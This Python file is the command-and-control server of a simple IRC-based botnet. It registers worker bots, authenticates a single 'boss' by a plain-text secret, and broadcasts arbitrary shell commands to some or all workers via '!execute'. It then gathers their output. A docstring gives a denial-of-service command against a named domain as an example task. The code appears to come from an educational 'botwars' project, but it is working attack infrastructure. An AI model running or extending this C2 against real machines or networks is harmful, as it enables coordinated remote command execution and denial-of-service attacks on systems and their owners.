#!/usr/bin/env python

import gevent
import logging
import os
import random
import re
import sys
import time

from gevent import socket
from gevent.event import Event
from gevent.queue import Queue
from logging.handlers import RotatingFileHandler
from optparse import OptionParser

from irc import IRCConnection, IRCBot


class BotnetWorker(object):
    """\
    Simple class to track available workers
    """
    def __init__(self, nick, name):
        self.nick = nick
        self.name = name
        self.awaiting_ping = Event()


class Task(object):
    """\
    A single command sent to any number of workers.  Serves as the storage for
    any results returned by the workers.
    """
    _id = 0
    
    def __init__(self, command):
        """\
        Initialize the Task with a command, where the command is a string
        representing the action to be taken, i.e. `dos charlesleifer.com`
        """
        self.command = command
        
        Task._id += 1
        self.id = Task._id
        self.data = {}
        
        self.workers = set()
        self.finished = set()
    
    def add(self, nick):
        """\
        Indicate that the worker with given nick is performing this task
        """
        self.data[nick] = ''
        self.workers.add(nick)
    
    def done(self, nick):
        """\
        Indicate that the worker with the given nick has finished this task
        """
        self.finished.add(nick)
    
    def is_finished(self):
        return self.finished == self.workers


class BotnetBot(IRCBot):
    """\
    Command and control bot for a simple Botnet
    """
    
    def __init__(self, conn, secret, channel):
        # initialize connection and register callbacks via parent class
        super(BotnetBot, self).__init__(conn)
        
        # store secret used for authentication and nick of administrator
        self.secret = secret
        self.boss = None
        
        # store channels -- possibly use random channel for the command channel?
        self.channel = channel
        self.cmd_channel = channel + '-cmd'
        
        # store worker bots in a dictionary keyed by nickname
        self.workers = {}
        
        # used for uptime
        self.start = time.time()
        
        # start a greenlet that periodically checks worker health
        self.start_worker_health_greenlet()
        
        # store tasks in a dictionary keyed by task id
        self.tasks = {}
        
        # get a logger instance piggy-backing off the underlying connection's
        # get_logger() method - this logger will be used to store data from
        # the workers
        self.logger = self.get_data_logger()
        
        # grab a reference to the connection logger for logging server state
        self.conn_logger = self.conn.logger
        
        # join the two channels
        self.conn.join(self.channel)
        self.conn.join(self.cmd_channel)
    
    def get_data_logger(self):
        return self.conn.get_logger('botnet.botnetbot.data.logger', 'botnet.data.log')
    
    def send_workers(self, msg):
        """\
        Convenience method to send data to the workers via command channel
        """
        self.respond(msg, self.cmd_channel)
    
    def send_user(self, msg):
        """\
        Convenience method to send data to the administrator via the normal channel
        """
        self.respond(msg, self.channel)
    
    def start_worker_health_greenlet(self):
        """\
        Start a greenlet that monitors workers' health
        """
        gevent.spawn(self._worker_health_greenlet)
    
    def _worker_health_greenlet(self):
        while 1:
            # broadcast a message to all workers
            self.send_workers('!worker-ping')
            
            # indicate that all workers are awaiting ping
            for worker_nick in self.workers:
                self.workers[worker_nick].awaiting_ping.set()
            
            # wait two minutes
            gevent.sleep(120)
            
            dead = []
            
            # find all workers who didn't respond to the ping
            for worker_nick, worker in self.workers.items():
                if worker.awaiting_ping.is_set():
                    self.conn_logger.warn('worker [%s] is dead' % worker_nick)
                    dead.append(worker_nick)
            
            if dead:
                self.send_user('Removed %d dead workers' % len(dead))
                
                for nick in dead:
                    self.unregister(nick)
    
    def require_boss(self, callback):
        """\
        Callback decorator that enforces the calling user be botnet administrator
        """
        def inner(nick, message, channel, *args, **kwargs):
            if nick != self.boss:
                return
            
            return callback(nick, message, channel, *args, **kwargs)
        return inner
    
    def command_patterns(self):
        return (
            ('\/join', self.join_handler),
            ('\/quit', self.quit_handler),
            ('!auth (?P<password>.+)', self.auth),
            ('!execute (?:(?P<num_workers>\d+)? )?(?P<command>.+)', self.require_boss(self.execute_task)),
            ('!print(?: (?P<task_id>\d+))?', self.require_boss(self.print_task)),
            ('!register (?P<hostname>.+)', self.register),
            ('!stop', self.require_boss(self.stop)),
            ('!status', self.require_boss(self.status)),
            ('!task-data (?P<task_id>\d+):(?P<data>.+)', self.task_data),
            ('!task-finished (?P<task_id>\d+)', self.task_finished),
            ('!task-received (?P<task_id>\d+)', self.task_received),
            ('!uptime', self.require_boss(self.uptime)),
            ('!worker-pong (?P<hostname>.+)', self.worker_health_handler),
            ('!help', self.require_boss(self.help)),
        )
    
    def join_handler(self, nick, message, channel):
        self.logger.debug('%s joined #%s' % (nick, channel))
    
    def quit_handler(self, nick, message, channel):
        if channel == self.cmd_channel and nick in self.workers:
            self.logger.info('Worker %s left, unregistering' % (nick))
            self.unregister(nick)
    
    def auth(self, nick, message, channel, password):
        if not self.boss and password == self.secret:
            self.boss = nick
            self.logger.info('%s authenticated successfully' % nick)
            return 'Success'
        else:
            self.logger.error('%s failed to authenticate' % nick)
    
    def execute_task(self, nick, message, channel, command, num_workers=None):
        task = Task(command)
        self.tasks[task.id] = task
        
        if num_workers is None or int(num_workers) >= len(self.workers):
            # short-hand way of sending to all workers
            num_workers = len(self.workers)
            self.send_workers('!worker-execute %s:%s' % (task.id, task.command))
        else:
            num_workers = int(num_workers)
            
            available_workers = set(self.workers.keys())
            sent = 0
            
            msg_template = '!worker-execute (%%s) %s:%s' % (task.id, task.command)
            
            max_msg_len = 400
            msg_len = len(msg_template % '')
            msg_diff = max_msg_len - msg_len
            
            available = msg_diff
            send_to = []
            
            # batch up command to workers
            while sent < num_workers:
                worker_nick = available_workers.pop()
                send_to.append(worker_nick)
                sent += 1
                available -= (len(worker_nick) + 1)
                
                if available <= 0 or sent == num_workers:
                    self.send_workers(msg_template % (','.join(send_to)))
                    available = msg_diff
                    send_to = []
        
        self.send_user('Scheduled task: "%s" with id %s [%d workers]' % (
            task.command, task.id, num_workers
        ))
    
    def execute_task_once(self, nick, message, channel, command):
        task = Task(command)
        self.tasks[task.id] = task
        
        worker = self.workers[random.choice(self.workers.keys())]
        self.send_user('Scheduled task: "%s" with id %s - worker: [%s:%s]' % (
            task.command, task.id, worker.nick, worker.name
        ))
        self.respond('!worker-execute %s:%s' % (task.id, task.command), nick=worker.nick)
    
    def print_task(self, nick, message, channel, task_id=None):
        if not self.tasks:
            return 'No tasks to print'
        
        task_id = int(task_id or max(self.tasks.keys()))
        task = self.tasks[task_id]
        
        def printer(task):
            for nick, data in task.data.iteritems():
                worker = self.workers[nick]
                self.send_user('[%s:%s] - %s' % (worker.nick, worker.name, task.command))
                for line in data.splitlines():
                    self.send_user(line.strip())
                    gevent.sleep(.2)
        
        gevent.spawn(printer, task)
    
    def uptime(self, nick, message, channel):
        curr = time.time()
        seconds_diff = curr - self.start
        hours, remainder = divmod(seconds_diff, 3600)
        minutes, seconds = divmod(remainder, 60)
        return 'Uptime: %d:%02d:%02d' % (hours, minutes, seconds)
    
    def register(self, nick, message, channel, hostname):
        if nick not in self.workers:
            self.workers[nick] = BotnetWorker(nick, hostname)
            self.logger.info('added worker [%s]' % nick)
        else:
            self.logger.warn('already registered [%s]' % nick)
        
        return '!register-success %s' % self.cmd_channel
    
    def unregister(self, worker_nick):
        del(self.workers[worker_nick])
    
    def status(self, nick, message, channel):
        self.send_user('%s workers available' % len(self.workers))
        self.send_user('%s tasks have been scheduled' % len(self.tasks))
    
    def stop(self, nick, message, channel):
        self.send_workers('!worker-stop')
    
    def task_data(self, nick, message, channel, task_id, data):
        # add the data to the task's data
        self.tasks[int(task_id)].data[nick] += '%s\n' % data
    
    def task_finished(self, nick, message, channel, task_id):
        task = self.tasks[int(task_id)]
        task.done(nick)
        
        self.conn_logger.info('task [%s] finished by worker %s' % (task.id, nick))
        self.logger.info('%s:%s:%s' % (task.id, nick, task.data))
        
        if task.is_finished():
            self.send_user('Task %s completed by %s workers' % (task.id, len(task.data)))
    
    def task_received(self, nick, message, channel, task_id):
        task = self.tasks[int(task_id)]
        task.add(nick)
        self.conn_logger.info('task [%s] received by worker %s' % (task.id, nick))
    
    def worker_health_handler(self, nick, message, channel, hostname):
        if nick in self.workers:
            self.workers[nick].awaiting_ping.clear()
            self.logger.debug('Worker [%s] is alive' % nick)
        else:
            self.register(nick, message, channel, hostname)

    def help(self, nick, message, channel, hostname):
        self.send_user('!execute (num workers) <command> -- run "command" on workers')
        self.send_user('!print (task id) -- print output of tasks or task with id')
        self.send_user('!stop -- tell workers to stop their current task')
        self.send_user('!status -- get status on workers and tasks')
        self.send_user('!uptime -- boss uptime')


def get_parser():
    parser = OptionParser(usage='%prog [options]')
    parser.add_option('--server', '-s', dest='server', default='irc.freenode.net',
        help='IRC server to connect to')
    parser.add_option('--port', '-p', dest='port', default=6667,
        help='Port to connect on', type='int')
    parser.add_option('--nick', '-n', dest='nick', default='boss1337',
        help='Nick to use')
    parser.add_option('--secret', '-x', dest='secret', default='password')
    parser.add_option('--channel', '-c', dest='channel', default='#botwars-test')
    parser.add_option('--logfile', '-f', dest='logfile')
    parser.add_option('--verbosity', '-v', dest='verbosity', default=1, type='int')
    
    return parser

if __name__ == '__main__':    
    parser = get_parser()
    (options, args) = parser.parse_args()
    
    conn = IRCConnection(options.server, options.port, options.nick,
        options.logfile, options.verbosity)
    conn.connect()
    
    bot = BotnetBot(conn, options.secret, options.channel)
    
    conn.enter_event_loop()
